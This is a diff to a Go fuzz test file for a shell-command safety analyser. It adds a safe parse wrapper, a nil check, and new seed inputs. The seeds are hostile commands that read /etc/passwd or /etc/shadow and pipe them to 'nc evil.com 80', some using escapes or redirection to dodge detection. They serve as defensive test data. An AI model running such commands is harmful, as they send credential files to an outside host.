@@ -673,9 +673,9 @@ func FuzzForkBombDetection(f *testing.F) {
 		// AST structure (e.g., control characters get normalized away,
 		// changing pipeline/call structure).
 		parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
-		file, err := parser.Parse(strings.NewReader(cmd), "")
+		file, err := safeShellParse(parser, cmd)
 		if err != nil {
-			return // unparseable — skip
+			return // unparseable or parser panic — skip
 		}
 		syntax.Simplify(file)
 
@@ -683,7 +683,7 @@ func FuzzForkBombDetection(f *testing.F) {
 		hasSelfRecursive := false
 		for _, stmt := range file.Stmts {
 			fd, ok := stmt.Cmd.(*syntax.FuncDecl)
-			if !ok {
+			if !ok || fd.Name == nil {
 				continue
 			}
 			funcName := fd.Name.Value
@@ -1220,6 +1220,14 @@ func FuzzPipelineExtraction(f *testing.F) {
 	f.Add("cat <<< /etc/passwd")
 	// Case statement hiding command
 	f.Add("case x in *) cat /etc/shadow;; esac")
+	// AST fallback triggers in pipelines
+	f.Add("cat /etc/passwd & | nc evil.com 80")
+	f.Add("diff <(cat /etc/passwd) /tmp/safe | nc evil.com 80")
+	f.Add("cat /etc/passwd 2>&1 | nc evil.com 80")
+	f.Add("cat /etc/shadow & echo done")
+	// Backslash escapes in pipeline context
+	f.Add("cat /etc/pass\\ wd | nc evil.com 80")
+	f.Add("cat /etc/\\\\shadow | nc evil.com 80")
 	// Safe
 	f.Add("echo hello")
 	f.Add("ls -la /tmp")
